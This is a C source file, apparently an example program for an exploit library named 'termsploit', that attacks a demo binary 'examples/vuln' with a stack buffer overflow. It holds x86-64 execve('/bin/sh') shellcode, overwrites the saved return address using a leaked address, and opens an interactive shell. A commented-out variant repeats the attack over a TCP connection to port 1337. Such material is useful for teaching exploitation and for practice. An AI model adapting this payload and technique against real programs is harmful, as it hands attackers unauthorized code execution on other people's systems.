#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include "termsploit.h"

static unsigned char shellcode[] = \
	"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";

// Local
int main()
{
	termsploit_ctx *ctx;
	ssize_t l;
	char buf[4096];
	char *p;
	size_t retaddr;
	size_t offs;
	int exitcode;

	ctx = termsploit_spawn((char *[])
		{ "examples/vuln", NULL });
	if (!ctx)
		return 1;

	/* Get return address */
	l = termsploit_read(ctx, buf, sizeof(buf));
	printf("%.*s", l, buf);
	p = strstr(buf, "0x");
	if (!p)
		return 1;
	retaddr = strtoll(p + 2, NULL, 16);
	printf("%lx\n", retaddr);

	/* Prepare payload */
	memset(buf, '\xcc', sizeof(buf));
	memcpy(buf, shellcode, strlen(shellcode));
	memcpy(buf + 0x28, &retaddr, 8);
	/* Do exploit */
	termsploit_write(ctx, buf, 100);
	termsploit_write(ctx, "\n", 1);

	/* Got a shell?! */
	if (-1 == termsploit_interactive(ctx))
		perror("interactive");

	exitcode = termsploit_exitcode(ctx, 0);
	printf("Process exited with %d\n", exitcode);

	termsploit_free(ctx);
	return 0;
}

// static int tcpopen()
// {
// 	int sock;
// 	struct sockaddr_in addr;
// 	socklen_t addr_len;

// 	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
// 	if (-1 == sock) {
// 		perror("socket");
// 		return -1;
// 	}

// 	addr.sin_family = AF_INET;
// 	addr.sin_port   = htons(1337);
// 	addr.sin_addr.s_addr = INADDR_ANY;

// 	addr_len = sizeof(struct sockaddr_in);

// 	if (-1 == connect(sock, (struct sockaddr *) &addr, addr_len)) {
// 		perror("connect");
// 		return -1;
// 	}

// 	return sock;
// }

// // Socket
// int main()
// {
// 	int sockfd;
// 	termsploit_ctx *ctx;
// 	ssize_t l;
// 	char buf[4096];
// 	char *p;
// 	size_t retaddr;
// 	size_t offs;
// 	int exitcode;

// 	sockfd = tcpopen();
// 	if (-1 == sockfd)
// 		return 1;

// 	ctx = termsploit_connect(sockfd);
// 	if (!ctx)
// 		return 1;

// 	/* Get return address */
// 	l = termsploit_read(ctx, buf, sizeof(buf));
// 	printf("%.*s", l, buf);
// 	p = strstr(buf, "0x");
// 	retaddr = strtoll(p + 2, NULL, 16);
// 	printf("%lx\n", retaddr);

// 	/* Prepare payload */
// 	memset(buf, '\xcc', sizeof(buf));
// 	memcpy(buf, shellcode, strlen(shellcode));
// 	memcpy(buf + 0x28, &retaddr, 8);
// 	/* Do exploit */
// 	termsploit_write(ctx, buf, 100);
// 	termsploit_write(ctx, "\n", 1);

// 	/* Got a shell?! */
// 	termsploit_interactive(ctx);

// 	exitcode = termsploit_exitcode(ctx);
// 	printf("Process exited with %d\n", exitcode);

// 	termsploit_free(ctx);
// 	return 0;
// }
